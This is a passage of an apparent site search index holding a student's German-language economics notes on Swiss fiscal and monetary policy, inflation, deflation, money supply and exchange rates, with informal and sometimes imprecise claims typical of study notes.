            "title": "Konjukturzyklen"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#konjukturpolitik", 
            "text": "In der Schweiz muss der Bund Konjukturpolitik betreiben (Gegen Marktwirtschaft)     Nichts tun: M\u00e4rkten sollen sich selbst regulieren.\n- Nachfrage nach Arbeit sinkt\n- L\u00f6hne m\u00fcssten kleiner werden\n- Davon profitieren Unternehmen, Angebot geht hinauf bis zur Balance\n- Preisniveau ist gesunken, aber L\u00f6hne auch -  gleiche Kaufkraft\n-  Problem : Arbeitsm\u00e4rkte ist reguliert, L\u00f6hne d\u00fcrfen nicht sinken. Funktioniert in der Praxis also nicht    Aktive Konjukturpolitik: Der Staat f\u00f6rdert die Nachfrage\n- Arbeitsm\u00e4rkte sind reguliert\n- Nachfrage-Kurve muss wieder nach rechts verschoben werden\n- Haushalte m\u00fcssen mehr Konsumieren oder Unternehmen mehr investieren\n- Weniger Steuern, weniger Zinsen f\u00fcr Haushalte\n- Wenn Staat Konjukturpolitik macht, ist es \"Fiskalpolitik\"\n- Wenn es die Zentralbank macht, \"Geldpolitik\"    St\u00e4rkung der automatischen Stabilisatoren: Staatliche Einnahmen und Ausgaben, damit bei R\u00fcckgang der Nachfrage diese automatisch stimuliert wird\n- Bremsung durch progressives Steursystem (Steuereinnahmen steigen exponentiell bei h\u00f6heren Einkommen)", 
            "title": "Konjukturpolitik"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#kritik-aktive-konjukturpolitik", 
            "text": "Rezession: Wenn BIP 2 Quartale hintereinander negativ ist  Verz\u00f6gerung ist also mindestens 3 Quartale  F\u00fcr Konjukturpaket muss Parlament entscheiden  Geht mit allem etwa 5 Jahre    Verz\u00f6gerung l\u00e4uft Gefahr, dass Korrektur kommt, wenn Hochkonjuktur herrscht  Durch f\u00f6deralistischem Prinzip haben Kantone viel Macht  Steuern sind auf Bundesebene viel tiefer als auf Kantonalebene!     Kantone m\u00fcssten mitziehen    Darum : In der Schweiz wird vorallem mit Stabilisatoren gearbeitet   In der Vergangenheit hat aktive Konjukturpolitik in der Schweiz schlecht funktioniert  Auf z.B. Ebene Europa machht es mehr Sinn, weil Rezessionen \u00fcber viele Jahre gehen", 
            "title": "Kritik aktive Konjukturpolitik"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#konkukturpolitik-2008-2010", 
            "text": "Letzte Krise 2008 ging die Rezession 3 Quartale lang  Konjukturpaket aufgrund von Druck  Erste Stufe 2009  Der Bund und die Baubranche hat vorallem profitiert    Zweite Stufe 2009  Schiene, Strasse, Infrastruktur  Hat erst viel sp\u00e4ter Wirkung  Wieder Vorteile f\u00fcr Baubranche    Dritte Stufe 2010  Bek\u00e4mpfung Arbeitslosigkeit  Kurzarbeit: Teil des Lohnes wird vom Staat \u00fcbernommen  Unternehmen entlassen weniger Arbeiter und k\u00f6nnen so Rezession ausharren  Gut f\u00fcr Arbeitgeber und Arbeitnehmer    Fr\u00fchzeitige R\u00fcckverteilung CO2-Abgabe, wird sowieso jedes Jahr gemacht und hat nichts mit Konjukturpolitik zu tun", 
            "title": "Konkukturpolitik 2008-2010"
        }, 
        {
            "location": "/Vwl/6_Konjuktur/#fazit_1", 
            "text": "War nicht \"timely\", da Einf\u00fchrung viel zu sp\u00e4t  Nicht \"targeted\", vorallem Staat und Baubranche hat profitiert  Nicht \"temporarly\": Gelder wurden bis 2015 ausgegeben  Gesamtpaket 2.1 Milliarden Fr. auf 550 Mrd. BIP - Wenig Einfluss  \"Placebo\"-Wirkung, auf Druck der Wirtschaft  Als Vergleich haben Kantone und Gemeinde zusammen Konjuktur-Pakete von  5 Mrd.  beschlossen  Insgesamt war der Einfluss 0.6% des BIPs -  sehr wenig", 
            "title": "Fazit"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/", 
            "text": "Preisstabilit\u00e4t\n\n\nInflation\n\n\n\n\nBei extremer Inflation geht W\u00e4hrung \"kaputt\"\n\n\nHeute ist Venezuela am n\u00e4hesten daran\n\n\nIn der Schweiz seit 20 Jahren nicht relevant\n\n\nDaf\u00fcr gibt es jetzt in der Schweiz Deflation\n\n\n\n\nEntstehung\n\n\n\n\nPermanente\n Steigerung des Preisniveau\n\n\nNicht Schwankungen des Preisniveaus!\n\n\n\n\n\n\nAusl\u00f6ser ist einmalige Steigerung des Preisniveaus\n\n\nexpansiver Nachfrageschock oder negativen Angebotsschock\n\n\n\n\n\n\nH\u00e4ngt auch von der Geldpolitik der Zentralbank ab (Geld drucken)\n\n\n\n\nExpansiver Nachfrageschock\n\n\n\n\nNachfrage geht nach rechts\n\n\nPreisniveau erh\u00f6ht sich (noch keine Inflation, evtl. Beginn)\n\n\n-\n \nNachfrageorientierte Inflation\n\n\n\n\nNegativer Angebotsschock\n\n\n\n\nAngebots-Kurve geht nach links\n\n\nPreisniveau steigt\n\n\n\n\nLohn-Preis-Spirale\n\n\n\n\nDurch erh\u00f6htes Preisnivaeu nimmt Kaufkraft ab\n\n\nHaushalte wollen Lohnerh\u00f6hung (\"auf Vorrat\" - \u00fcberkompensation)\n\n\nH\u00f6here Produktionskosten der Unternehmen\n\n\nDadurch h\u00f6here Preise (\"wieder auf Vorrat\")\n\n\n\n\nPreisniveau steigt weiter, usw..\n\n\n\n\n\n\nVerursacht durch \u00dcberkompensation der Inflation\n\n\n\n\nInflation geht nur, wenn dann Zentralbank Geld druckt\n\n\nInflation hilft dem Staat, weil Schulden dadurch (real) kleiner\n\n\n\"Bezahlt\" durch Kreditgeber des Staates (meist das eigene Volk z.B. durch Staatsanleihen) oder z.B. Pensionskasse\n\n\n\n\n\n\n\n\nQuantit\u00e4tsgleichung\n\n\n\n\n\n\nP x Q = M x V\n\n\n\n\nV ergibt sich aus den Anderen Variablen\n\n\nP = Preisniveau\n\n\nQ = reales BIP\n\n\nM = Geldmenge ingesamt in der Schweiz\n\n\nP x Q = Nominales BIP\n\n\nV = Geldumlaufgeschwindigkeit \n\\frac{P x Q}{M}\n\n\n\n\nMit einer Note werden im Jahr mehrere Zahlungen gemacht\n\n\nNoten: \n 1\n\n\nSparkonten: \n 1\n\n\nIn der Schweiz ca. 0.18 sinkend\n\n\n\n\n\n\nWenn Geldmenge gr\u00f6sser wird, muss bei gleichem BIP das Preisniveau steigen\n\n\n\n\nIn der Schweiz ist M gestiegen, P und Q etwa gleich geblieben\n\n\n\n\nAlso muss Geldumlaufmenge gesunken sein -\n Mehr gespart\n\n\nViel Geld liegt bei den Gesch\u00e4ftsbanken\n\n\nWenig Nachfrage nach Krediten bei Banken, grosse Unternehmen haben hohe Liquidit\u00e4t\n\n\n\n\n\n\n\n\n\n\n\n\nUSA hat als Ausgleich Zinsen erh\u00f6ht, um Wachstum zu bremsen\n\n\n\n\nDadurch investieren Unternehmen weniger und Haushalte sparen mehr\n\n\n\n\n\n\n\n\nErh\u00f6hung der Geldmenge\n\n\n\n\nNachfrage-Kurve verschiebt sich nach rechts\n\n\nZinsen sinken -\n Haushalte geben mehr aus\n\n\n\n\n\n\nAuswirkung: Preisniveau und BIP steigt\n\n\nBIP-Steigerung \u00fcberwiegt Erh\u00f6hung des Preisniveaus, wenn in einer Depression\n\n\n\n\n\n\nIn einer Boom-Phase ist die gleiche Erh\u00f6hung des Angebots sch\u00e4dlicher, weil das BIP weniger steigt als das Preisniveau\n\n\nDas ist das Problem am Euro: Erh\u00f6hung der Geldmenge hat je nach Konjuktur-Lage einen negativen (DE) oder positiven (Griechenland) Einfluss\n\n\n\n\nKosten der Inflation\n\n\n\n\nZinsen werden in Inflationszinsen eher zu hoch angesetzt aus Unsicherheit\n\n\nPreise werden verzerrt, weil verschiedene G\u00fcter unterschiedlich schnell teurer werden, Preisgef\u00fchl geht verloren\n\n\n\n\nBek\u00e4mpfung der Inflation\n\n\n\n\nNachfrage runterdr\u00fccken durch restriktive Geldpolitik\n\n\nPreis: Niedrigeres BIP, mehr Arbeitslosigkeit\n\n\n\n\nDeflation\n\n\n\n\nPermanenter R\u00fcckgang des Preisniveaus\n\n\nKann Angebotsorientiert werden: Angebot steigt\n\n\nOder Nachfrageorientiert: Nachfrage sinkt (weniger konsumiert)\n\n\n\"Depressionsfalle\" wie in Japan\n\n\nPreise sinken, Haushalte sparen\n\n\nImmer weniger Bev\u00f6lkerung (Alterung)\n\n\nIst abgeschlossen (keine Immigration)\n\n\n\n\n\n\nDeflationserwartung ist selbsterf\u00fcllend\n\n\nNominall\u00f6hne bleiben gleich, wird f\u00fcr Unternehmen teurer\n\n\nStaat gibt mehr aus als Gegenmittel, f\u00fchrt aber zu hohen Staatsschulden", 
            "title": "7 Preisstabilit\u00e4t"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#preisstabilitat", 
            "text": "", 
            "title": "Preisstabilit\u00e4t"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#inflation", 
            "text": "Bei extremer Inflation geht W\u00e4hrung \"kaputt\"  Heute ist Venezuela am n\u00e4hesten daran  In der Schweiz seit 20 Jahren nicht relevant  Daf\u00fcr gibt es jetzt in der Schweiz Deflation", 
            "title": "Inflation"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#entstehung", 
            "text": "Permanente  Steigerung des Preisniveau  Nicht Schwankungen des Preisniveaus!    Ausl\u00f6ser ist einmalige Steigerung des Preisniveaus  expansiver Nachfrageschock oder negativen Angebotsschock    H\u00e4ngt auch von der Geldpolitik der Zentralbank ab (Geld drucken)", 
            "title": "Entstehung"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#expansiver-nachfrageschock", 
            "text": "Nachfrage geht nach rechts  Preisniveau erh\u00f6ht sich (noch keine Inflation, evtl. Beginn)  -   Nachfrageorientierte Inflation", 
            "title": "Expansiver Nachfrageschock"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#negativer-angebotsschock", 
            "text": "Angebots-Kurve geht nach links  Preisniveau steigt", 
            "title": "Negativer Angebotsschock"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#lohn-preis-spirale", 
            "text": "Durch erh\u00f6htes Preisnivaeu nimmt Kaufkraft ab  Haushalte wollen Lohnerh\u00f6hung (\"auf Vorrat\" - \u00fcberkompensation)  H\u00f6here Produktionskosten der Unternehmen  Dadurch h\u00f6here Preise (\"wieder auf Vorrat\")   Preisniveau steigt weiter, usw..    Verursacht durch \u00dcberkompensation der Inflation   Inflation geht nur, wenn dann Zentralbank Geld druckt  Inflation hilft dem Staat, weil Schulden dadurch (real) kleiner  \"Bezahlt\" durch Kreditgeber des Staates (meist das eigene Volk z.B. durch Staatsanleihen) oder z.B. Pensionskasse", 
            "title": "Lohn-Preis-Spirale"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#quantitatsgleichung", 
            "text": "P x Q = M x V   V ergibt sich aus den Anderen Variablen  P = Preisniveau  Q = reales BIP  M = Geldmenge ingesamt in der Schweiz  P x Q = Nominales BIP  V = Geldumlaufgeschwindigkeit  \\frac{P x Q}{M}   Mit einer Note werden im Jahr mehrere Zahlungen gemacht  Noten:   1  Sparkonten:   1  In der Schweiz ca. 0.18 sinkend    Wenn Geldmenge gr\u00f6sser wird, muss bei gleichem BIP das Preisniveau steigen   In der Schweiz ist M gestiegen, P und Q etwa gleich geblieben   Also muss Geldumlaufmenge gesunken sein -  Mehr gespart  Viel Geld liegt bei den Gesch\u00e4ftsbanken  Wenig Nachfrage nach Krediten bei Banken, grosse Unternehmen haben hohe Liquidit\u00e4t       USA hat als Ausgleich Zinsen erh\u00f6ht, um Wachstum zu bremsen   Dadurch investieren Unternehmen weniger und Haushalte sparen mehr", 
            "title": "Quantit\u00e4tsgleichung"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#erhohung-der-geldmenge", 
            "text": "Nachfrage-Kurve verschiebt sich nach rechts  Zinsen sinken -  Haushalte geben mehr aus    Auswirkung: Preisniveau und BIP steigt  BIP-Steigerung \u00fcberwiegt Erh\u00f6hung des Preisniveaus, wenn in einer Depression    In einer Boom-Phase ist die gleiche Erh\u00f6hung des Angebots sch\u00e4dlicher, weil das BIP weniger steigt als das Preisniveau  Das ist das Problem am Euro: Erh\u00f6hung der Geldmenge hat je nach Konjuktur-Lage einen negativen (DE) oder positiven (Griechenland) Einfluss", 
            "title": "Erh\u00f6hung der Geldmenge"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#kosten-der-inflation", 
            "text": "Zinsen werden in Inflationszinsen eher zu hoch angesetzt aus Unsicherheit  Preise werden verzerrt, weil verschiedene G\u00fcter unterschiedlich schnell teurer werden, Preisgef\u00fchl geht verloren", 
            "title": "Kosten der Inflation"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#bekampfung-der-inflation", 
            "text": "Nachfrage runterdr\u00fccken durch restriktive Geldpolitik  Preis: Niedrigeres BIP, mehr Arbeitslosigkeit", 
            "title": "Bek\u00e4mpfung der Inflation"
        }, 
        {
            "location": "/Vwl/7_Preisstabilit\u00e4t/#deflation", 
            "text": "Permanenter R\u00fcckgang des Preisniveaus  Kann Angebotsorientiert werden: Angebot steigt  Oder Nachfrageorientiert: Nachfrage sinkt (weniger konsumiert)  \"Depressionsfalle\" wie in Japan  Preise sinken, Haushalte sparen  Immer weniger Bev\u00f6lkerung (Alterung)  Ist abgeschlossen (keine Immigration)    Deflationserwartung ist selbsterf\u00fcllend  Nominall\u00f6hne bleiben gleich, wird f\u00fcr Unternehmen teurer  Staat gibt mehr aus als Gegenmittel, f\u00fchrt aber zu hohen Staatsschulden", 
            "title": "Deflation"
        }, 
        {
            "location": "/Vwl/8_Geld/", 
            "text": "Geld\n\n\nFunktionen und Entstehung von Geld\n\n\n\n\nGeld ist Repr\u00e4sentation von Wertsch\u00f6pfung\n\n\nMuss aufbewarbar sein, einfach getauscht werden k\u00f6nnen\n\n\n\n\nGeldschaffung\n\n\n\n\nMehrheit des Schweizer Geldes wird von Gesch\u00e4ftsbanken \"erzeugt\"\n\n\nFr\u00fcher waren Goldschmiede Bankier, indem sie Quittungen als Kredite vergeben haben\n\n\nWar effizenter, als physisches Gold immer abzuholen und vom Verk\u00e4ufer wieder \"einbezahlen\"\n\n\nSo wurden Quittungen zu \"Banknoten\"\n\n\nEs wurde aber nie das gesamte physische Gold abgeholt, es musste gar nicht mehr zu 100% gedeckt werden\n\n\n\n\n\n\nHeute wird das Geld von der Nationalbank von den Gesch\u00e4ftsbanken auch mehrmals vergeben\n\n\nDaf\u00fcr braucht es aber Vertrauen in die Zahlungsf\u00e4higkeit der Banken\n\n\nAktuell m\u00fcssen die Banken 2.5% der Kredite als Reserve anlegen, so kann sie es maximal 40x multiplizieren\n\n\nMomentan ist die echte Zahl aber deutlich tiefer (\n 2), weil wenig Anfrage an Krediten existiert\n\n\nIn China ist der Mindestreservesatz 17% (6x Multiplikation)\n\n\nDas Vertrauen in die Schweizer Banken ist gr\u00f6sser\n\n\n\n\n\n\nvon EZB 1%, USA 10%\n\n\n\n\n\n\n\n\nGeldmenge\n\n\n\n\nM0\n: Geld der Notenbank (Bargeld + Girokonten der Gesch\u00e4ftsbanken auf der SNB)\n\n\nM1\n: M0 + Sichteinlagen (privatkonten) + Transaktionskosten\n\n\nM2\n: M1 + Sparkeinlagen\n\n\n\n\nM3\n: Gesamtmenge der Schweiz, mit Wertsch\u00f6pfung\n\n\n\n\n\n\nGeldmenge M0 ist seit 2011 verzehnfacht worden (von der SNB)\n\n\n\n\nHistorisch immer etwa 50 Mia., heute \u00fcber 400 Mia.\n\n\nWird auch von allen anderen Zentralbanken gemacht\n\n\n\n\n\n\nM3 (gesamte Geldmenge) ist aber kaum gestiegen\n\n\nheisst: Wertsch\u00f6pfungsmultiplikator ist stark gesunken (von 8-10 auf \n 2)\n\n\nKann dadurch auch nicht Inflation erzeugen, weil das Geld nicht in die reale Wirtschaft fliesst (\"steriles Geld\")\n\n\n\n\n\n\nSchluss: Nationalbanken k\u00f6nnen die gesamte Geldmenge nicht wirklich beeinflussen\n\n\nBekannte Ursache: Kreditanfrage gesunken (starke Liquidit\u00e4t, schwaches Wirtschaftswachstum verleitet zu weniger Investitionen)\n\n\nBtw: In der USA ist M1 \n M0! -\n Wertsch\u00f6pfungsmultiplikator gegen M1 \n 1\n\n\n\n\nZahlungsverkehr Girokonten\n\n\n\n\nTransaktionen in der Schweiz gehen \u00fcber die Girokontos der Gesch\u00e4ftsbanken auf der SNB\n\n\nWird in der Schweiz verwaltet von SIC (Tochterunternehmen SNB)\n\n\nGesch\u00e4ftsbanken k\u00f6nnen von der SNB Geld \"kaufen\" f\u00fcr Zins (SARON) - heute negativ!\n\n\n\n\nGeldpolitik\n\n\nOffenmarktpolitik\n\n\n\n\nWenn die SNB Geld schafft, steigt ihre Bilanzsumme. Damit Aktiven und Passiven gleich bleiben, muss sie Aktien oder Obligationen kaufen (meist bei inl\u00e4ndischen Gesch\u00e4ftsbanken), diese werden bei den Girokonten eingetragen\n\n\nUmgekehrt kann sie Aktiva verkaufen, um die Geldmenge zu verringern\n\n\nNationalbank kauft nie direkt W\u00e4hrungen, sondern Wertpapiere, die auf andere W\u00e4hrungen laufen (Devisen)\n\n\nHeute kauft seit der Krise 2010 die SNB vor allem solche Wertpapiere auf andere W\u00e4hrungen\n\n\nUm Schweizer Franken zu schw\u00e4chen (schwacher Euro)\n\n\n\n\n\n\nNationalbanken d\u00fcrfen keine Staaten finanzieren (mit erfundenem Geld)\n\n\nSonst w\u00fcrde das Vertrauen in die W\u00e4hrung verloren gehen\n\n\nABER: Die Gewinne der Investitionen der SNB werden an die Kantone verteilt\n\n\n\n\n\n\n\n\nMindestreservesatz\n\n\n\n\nIst in der Schweiz stetig auf 2.5%\n\n\nGeldmenge wird nur mit Offenmarktpolitik gesteuert\n\n\n\n\nNegativzinsen\n\n\n\n\nWirken auf Girokonten der SNB (-0.75%)\n\n\nNegativ-Zins wirkt nur ab Betr\u00e4gen ab 20facher Mindestreserve\n\n\nFreibetrag gilt aber nur f\u00fcr Gesch\u00e4ftsbanken, nicht f\u00fcr Versicherungen, Pensionskassen, etc., die m\u00fcssen alles negativ verzinsen\n\n\nNegativzinsen \u00fcbernommen von EZB (aber weniger)\n\n\n\n\nZiel: CHF weniger attraktiv machen, um Wechselkurs zu stabilisieren\n\n\n\n\n\n\nSNB ist Aktiengesellschaft der B\u00f6rse\n\n\n\n\nGeh\u00f6rt den Kantonen\n\n\nAktien ohne Stimm- oder Gewinnrecht\n\n\n\n\n\n\n\n\nHistorie der Schweizer Geldpolitik\n\n\n\n\nVor dem 2. WK kaum Einflusss auf heute\n\n\nFixe Wechselkurse 1944 beim Treffen der Siegerm\u00e4chte\n\n\nUS$ als internationale Leitw\u00e4hrung, auch f\u00fcr Schweiz\n\n\n\n\n\n\nBis 1973 funktioniert. Wegen verlorenem Vietnamkrieg mit Frankreich (Kolonialherrschaft), USA hat \u00fcbernommen, ebenfalls verloren.\n\n\nInflation des US-Dollars wegen Finanzierung des Vietnamkriegs, hat sich \u00fcbertragen auf ganzen Westen\n\n\nGolddeckung aufgel\u00f6st\n\n\n\n\n\n\n1974-1999: Orientierung an der Geldmenge\n\n\nEs wurde proportional zum BIP mehr oder weniger Geld gedruckt\n\n\nGeht, solange \nV\n konstant ist\n\n\nEnde der 80er wurde \nV\n flexibel\n\n\n\n\n\n\nAb 1999: Orientierung an Inflationsprognosen", 
            "title": "8 Geld"
        }, 
        {
            "location": "/Vwl/8_Geld/#geld", 
            "text": "", 
            "title": "Geld"
        }, 
        {
            "location": "/Vwl/8_Geld/#funktionen-und-entstehung-von-geld", 
            "text": "Geld ist Repr\u00e4sentation von Wertsch\u00f6pfung  Muss aufbewarbar sein, einfach getauscht werden k\u00f6nnen", 
            "title": "Funktionen und Entstehung von Geld"
        }, 
        {
            "location": "/Vwl/8_Geld/#geldschaffung", 
            "text": "Mehrheit des Schweizer Geldes wird von Gesch\u00e4ftsbanken \"erzeugt\"  Fr\u00fcher waren Goldschmiede Bankier, indem sie Quittungen als Kredite vergeben haben  War effizenter, als physisches Gold immer abzuholen und vom Verk\u00e4ufer wieder \"einbezahlen\"  So wurden Quittungen zu \"Banknoten\"  Es wurde aber nie das gesamte physische Gold abgeholt, es musste gar nicht mehr zu 100% gedeckt werden    Heute wird das Geld von der Nationalbank von den Gesch\u00e4ftsbanken auch mehrmals vergeben  Daf\u00fcr braucht es aber Vertrauen in die Zahlungsf\u00e4higkeit der Banken  Aktuell m\u00fcssen die Banken 2.5% der Kredite als Reserve anlegen, so kann sie es maximal 40x multiplizieren  Momentan ist die echte Zahl aber deutlich tiefer (  2), weil wenig Anfrage an Krediten existiert  In China ist der Mindestreservesatz 17% (6x Multiplikation)  Das Vertrauen in die Schweizer Banken ist gr\u00f6sser    von EZB 1%, USA 10%", 
            "title": "Geldschaffung"
        }, 
        {
            "location": "/Vwl/8_Geld/#geldmenge", 
            "text": "M0 : Geld der Notenbank (Bargeld + Girokonten der Gesch\u00e4ftsbanken auf der SNB)  M1 : M0 + Sichteinlagen (privatkonten) + Transaktionskosten  M2 : M1 + Sparkeinlagen   M3 : Gesamtmenge der Schweiz, mit Wertsch\u00f6pfung    Geldmenge M0 ist seit 2011 verzehnfacht worden (von der SNB)   Historisch immer etwa 50 Mia., heute \u00fcber 400 Mia.  Wird auch von allen anderen Zentralbanken gemacht    M3 (gesamte Geldmenge) ist aber kaum gestiegen  heisst: Wertsch\u00f6pfungsmultiplikator ist stark gesunken (von 8-10 auf   2)  Kann dadurch auch nicht Inflation erzeugen, weil das Geld nicht in die reale Wirtschaft fliesst (\"steriles Geld\")    Schluss: Nationalbanken k\u00f6nnen die gesamte Geldmenge nicht wirklich beeinflussen  Bekannte Ursache: Kreditanfrage gesunken (starke Liquidit\u00e4t, schwaches Wirtschaftswachstum verleitet zu weniger Investitionen)  Btw: In der USA ist M1   M0! -  Wertsch\u00f6pfungsmultiplikator gegen M1   1", 
            "title": "Geldmenge"
        }, 
        {
            "location": "/Vwl/8_Geld/#zahlungsverkehr-girokonten", 
            "text": "Transaktionen in der Schweiz gehen \u00fcber die Girokontos der Gesch\u00e4ftsbanken auf der SNB  Wird in der Schweiz verwaltet von SIC (Tochterunternehmen SNB)  Gesch\u00e4ftsbanken k\u00f6nnen von der SNB Geld \"kaufen\" f\u00fcr Zins (SARON) - heute negativ!", 
            "title": "Zahlungsverkehr Girokonten"
        }, 
        {
            "location": "/Vwl/8_Geld/#geldpolitik", 
            "text": "", 
            "title": "Geldpolitik"
        }, 
        {
            "location": "/Vwl/8_Geld/#offenmarktpolitik", 
            "text": "Wenn die SNB Geld schafft, steigt ihre Bilanzsumme. Damit Aktiven und Passiven gleich bleiben, muss sie Aktien oder Obligationen kaufen (meist bei inl\u00e4ndischen Gesch\u00e4ftsbanken), diese werden bei den Girokonten eingetragen  Umgekehrt kann sie Aktiva verkaufen, um die Geldmenge zu verringern  Nationalbank kauft nie direkt W\u00e4hrungen, sondern Wertpapiere, die auf andere W\u00e4hrungen laufen (Devisen)  Heute kauft seit der Krise 2010 die SNB vor allem solche Wertpapiere auf andere W\u00e4hrungen  Um Schweizer Franken zu schw\u00e4chen (schwacher Euro)    Nationalbanken d\u00fcrfen keine Staaten finanzieren (mit erfundenem Geld)  Sonst w\u00fcrde das Vertrauen in die W\u00e4hrung verloren gehen  ABER: Die Gewinne der Investitionen der SNB werden an die Kantone verteilt", 
            "title": "Offenmarktpolitik"
        }, 
        {
            "location": "/Vwl/8_Geld/#mindestreservesatz", 
            "text": "Ist in der Schweiz stetig auf 2.5%  Geldmenge wird nur mit Offenmarktpolitik gesteuert", 
            "title": "Mindestreservesatz"
        }, 
        {
            "location": "/Vwl/8_Geld/#negativzinsen", 
            "text": "Wirken auf Girokonten der SNB (-0.75%)  Negativ-Zins wirkt nur ab Betr\u00e4gen ab 20facher Mindestreserve  Freibetrag gilt aber nur f\u00fcr Gesch\u00e4ftsbanken, nicht f\u00fcr Versicherungen, Pensionskassen, etc., die m\u00fcssen alles negativ verzinsen  Negativzinsen \u00fcbernommen von EZB (aber weniger)   Ziel: CHF weniger attraktiv machen, um Wechselkurs zu stabilisieren    SNB ist Aktiengesellschaft der B\u00f6rse   Geh\u00f6rt den Kantonen  Aktien ohne Stimm- oder Gewinnrecht", 
            "title": "Negativzinsen"
        }, 
        {
            "location": "/Vwl/8_Geld/#historie-der-schweizer-geldpolitik", 
            "text": "Vor dem 2. WK kaum Einflusss auf heute  Fixe Wechselkurse 1944 beim Treffen der Siegerm\u00e4chte  US$ als internationale Leitw\u00e4hrung, auch f\u00fcr Schweiz    Bis 1973 funktioniert. Wegen verlorenem Vietnamkrieg mit Frankreich (Kolonialherrschaft), USA hat \u00fcbernommen, ebenfalls verloren.  Inflation des US-Dollars wegen Finanzierung des Vietnamkriegs, hat sich \u00fcbertragen auf ganzen Westen  Golddeckung aufgel\u00f6st    1974-1999: Orientierung an der Geldmenge  Es wurde proportional zum BIP mehr oder weniger Geld gedruckt  Geht, solange  V  konstant ist  Ende der 80er wurde  V  flexibel    Ab 1999: Orientierung an Inflationsprognosen", 
            "title": "Historie der Schweizer Geldpolitik"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/", 
            "text": "Wechselkurse\n\n\n\n\nNominaler Wechselkurs \ne\n: Verh\u00e4ltnis einer W\u00e4hrung (= M3 Menge) zur anderen\n\n\nIst volkswirtschaftlich unwichtig\n\n\n\n\n\n\nSinkt nominaler Kurs, wird die inl\u00e4ndische W\u00e4hrung \naufgewertet\n\n\nSchlecht f\u00fcr Exporte\n\n\n\n\n\n\n\n\nRealer Wechselkurs\n\n\n\n\nRealer Wechselkurs: \nr = \\frac{e \\cdot p*}{p}\n\n\n\n\n\n\np*\n : Preis G\u00fcterkorb im Ausland in ausl\u00e4ndischer W\u00e4hrung\n\n\n\n\np\n: Preis G\u00fcterkorb im Inland in inl\u00e4ndischer W\u00e4hrung\n\n\nWechselkurs \u00e4ndert sich sofort mit der Geldmenge\n\n\nPreise f\u00fcr den G\u00fcterkorb sind viel tr\u00e4ger\n\n\nMietpreise z.B. lassen sich erst nach 3 Monaten \u00e4ndern\n\n\nim Durchschnitt 1-3 Jahre, bis Geldmengenerh\u00f6hung als Preiserh\u00f6hung komplett ankommt\n\n\n\n\n\n\nKurzfristig wird bei Erh\u00f6hung von \ne\n die W\u00e4hrung abgewertet, Gut f\u00fcr Exporte\n\n\nLangfristig passt sich \np\n aber an, realer Wechselkurs gleicht sich aus\n\n\nJapan z.B. erh\u00f6hte die Geldmenge in den letzten Jahren, was langfristig nichts bringt\n\n\n\n\nFixe Wechselkurse\n\n\n\n\nz.B. Bretton-Woods nach 2. WK\n\n\nNachteil, dass das Land die Geldmenge an der Leitw\u00e4hrung anpassen muss\n\n\nWenn sich zwei L\u00e4ndern in unterschiedlichen Konjukturzyklen verhindern, funktioniert ein fixer Wechselkurs nicht (siehe D / GB)\n\n\nNach dem Bretton-Woods wurde EWS gegr\u00fcndet (ohne Schweiz), die W\u00e4hrungen wurden am D-Mark angeh\u00e4ngt\n\n\nInflationsraten gesunken in EWS-L\u00e4ndern\n\n\n\n\nr\n wurde wegen erh\u00f6hter Inflation als in Deutschland erh\u00f6ht, auch wenn der nominale Kurs konstant war (ab 1988) -\n Zusammenbruch der Exportindustrie von Italien\n\n\n\n\n\n\n\n\nW\u00e4hrungsunionen\n\n\n\n\nEine Zentralbank mit einer W\u00e4hrung f\u00fcr alle Nationen in der Union\n\n\nProblem: Unterschiedliche Konjuktur\n\n\nW\u00fcrde funktionieren, wenn flexible L\u00f6hne gelten w\u00fcrden und Arbeitskr\u00e4fte wandern w\u00fcrdern, die die Konjuktur ausgleichen w\u00fcrden\n\n\nFunktioniert in Europa aber nicht durch kulturelle / sprachliche Unterschiede\n\n\nIn den USA geht das z.B.\n\n\n\n\n\n\nEWU stellte zur Aufnahme Bedingungen an Geld- und Fiskalpolitik\n\n\nGriechenland erf\u00fcllte Bedingungen nicht, kam aber trotzdem rein (\"Geburtsst\u00e4dte der Demokratie\")\n\n\n\n\n\n\nZiel der EU: Keine Kriege mehr von Europa ausgehend\n\n\n\n\nEurokrise\n\n\n\n\nNichts zu tun mit US Immobilienkrisen, nur fast gleichzeitig\n\n\n2013: \u00dcberschuldung Griechenland erh\u00f6hte Sorge \u00fcber andere L\u00e4nder (Italien, Spanien, Portugal, etc.)\n\n\nVertrauen in R\u00fcckzahlungsf\u00e4higkeit der Staaten sinkt\n\n\nSchuldzinsen waren vor 2000 in schw\u00e4cheren EU-Staaten viel h\u00f6her (weil h\u00f6heres Risiko) als z.B. in Deutschland\n\n\nMit Einf\u00fchrung des Euros wurden alle Schuldzinss\u00e4tze auf die Ebene Deutschlands gesenkt (durch Finanzm\u00e4rkte)\n\n\nGIPS-Staaten nahmen so viel mehr Kredite auf und verschuldeten sich h\u00f6her, w\u00e4hrend Wirtschaftskraft sich nicht \u00e4nderte\n\n\nNB: Deutschland hat Schuldgrenze von 60% des BIPs als erstes \u00fcberschritten, es gab keine Sanktionen daf\u00fcr\n\n\nVerschuldung hat zum Zusammenbruch der Exportindustrie gef\u00fchrt\n\n\n\n\ne\n = 1\n\n\nWirtschaftsboom, Preisniveau steigt\n\n\n\n\nr\n wird kleiner, weil \np\n schneller steigt als \np*\n, Wechselkurs wertet sich auf\n\n\nSchw\u00e4cht Exportindustrie\n\n\n\n\n\n\nL\u00f6sungsvorschl\u00e4ge, Eurozonen zu spalten in schwache und starke Euro-Zonen, aber das w\u00fcrde gegen die Friedenspolitische Idee der EU", 
            "title": "9 Wechselkurse"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/#wechselkurse", 
